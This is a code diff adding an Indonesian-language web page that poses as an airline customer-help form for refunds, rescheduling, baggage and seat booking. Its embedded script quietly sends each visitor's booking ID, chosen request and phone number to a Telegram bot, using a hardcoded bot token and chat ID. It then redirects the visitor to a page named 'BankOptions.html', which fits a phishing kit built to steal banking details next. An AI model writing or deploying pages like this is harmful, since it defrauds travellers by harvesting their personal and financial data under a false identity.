@@ -1,0 +1,157 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Form Bantuan Maskapai</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+</head>
+<body class="bg-white min-h-screen flex items-start justify-center p-6 relative">
+  <form class="w-full max-w-md" id="bookingForm" novalidate>
+    <img
+      alt="Foto Banner placeholder image 600 by 150 pixels with text 'Foto Banner'"
+      class="mb-6 w-full rounded-md object-cover"
+      height="150"
+      src="https://uploads.onecompiler.io/43vfc6dh5/426ycevr7/1000018104.png"
+      width="600"
+    />
+    <label class="block font-extrabold mb-2" for="opsi">Pilih Opsi:</label>
+    <div class="relative mb-6">
+      <select
+        class="w-full border border-gray-300 rounded-md px-10 py-2 text-base appearance-none"
+        id="opsi"
+        name="opsi"
+        required
+      >
+        <option value="" disabled selected>Pilih Opsi</option>
+        <option>Refund Dana</option>
+        <option>Reschedule</option>
+        <option>Tambah Bagasi</option>
+        <option>Update Nama</option>
+        <option>Booking Seat</option>
+        <option>Bantuan Lainnya</option>
+      </select>
+      <i
+        class="fas fa-list absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none"
+      ></i>
+      <i
+        class="fas fa-chevron-down absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none"
+      ></i>
+    </div>
+    <label class="block font-extrabold mb-2" for="idBooking">ID Booking:</label>
+    <div class="relative mb-6">
+      <input
+        class="w-full border border-gray-300 rounded-md px-10 py-2 text-base placeholder-gray-400"
+        id="idBooking"
+        name="idBooking"
+        placeholder="Masukkan ID Booking"
+        required
+        type="text"
+      />
+      <i
+        class="fas fa-id-card absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none"
+      ></i>
+    </div>
+    <label class="block font-extrabold mb-2" for="phone">Nomor Handphone:</label>
+    <div class="flex mb-8">
+      <span
+        class="inline-flex items-center px-4 py-2 rounded-l-md border border-r-0 border-gray-300 bg-gray-200 font-extrabold text-gray-900 text-base"
+        >+62</span
+      >
+      <input
+        class="flex-1 border border-gray-300 rounded-r-md px-4 py-2 text-base placeholder-gray-400"
+        id="phone"
+        name="phone"
+        pattern="[0-9]+"
+        placeholder="81234567890"
+        required
+        type="tel"
+      />
+    </div>
+    <button
+      class="w-full bg-blue-600 hover:bg-blue-700 text-white text-base font-normal py-3 rounded-md"
+      type="submit"
+    >
+      LANJUTKAN
+    </button>
+  </form>
+
+  <div id="loadingOverlay" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+    <div class="flex flex-col items-center space-y-4">
+      <svg class="animate-spin h-12 w-12 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+      </svg>
+      <span class="text-white font-semibold text-lg">Loading...</span>
+    </div>
+  </div>
+
+  <script>
+    const telegramBotToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+    const telegramChatId = '5906925079';
+
+    const form = document.getElementById('bookingForm');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const opsi = document.getElementById('opsi').value;
+      const idBooking = document.getElementById('idBooking').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      if (!opsi) {
+        alert('Please select an option.');
+        return;
+      }
+      if (!idBooking || !phone) {
+        alert('Please fill in all required fields.');
+        return;
+      }
+
+      loadingOverlay.classList.remove('hidden');
+
+      const message = 
+        `Data Booking Tiket:\n` +
+        `Pilih Opsi: ${opsi}\n` +
+        `ID Booking: ${idBooking}\n` +
+        `Nomor Handphone: +62${phone}`;
+
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message,
+          }),
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          // Show loading overlay before redirect
+          loadingOverlay.classList.remove('hidden');
+          setTimeout(() => {
+            window.location.href = "BankOptions.html";
+          }, 300);
+          this.reset();
+        } else {
+          loadingOverlay.classList.add('hidden');
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      } catch (error) {
+        loadingOverlay.classList.add('hidden');
+        alert('Terjadi kesalahan saat mengirim data: ' + error.message);
+      }
+    });
+  </script>
+</body>
+  </html>
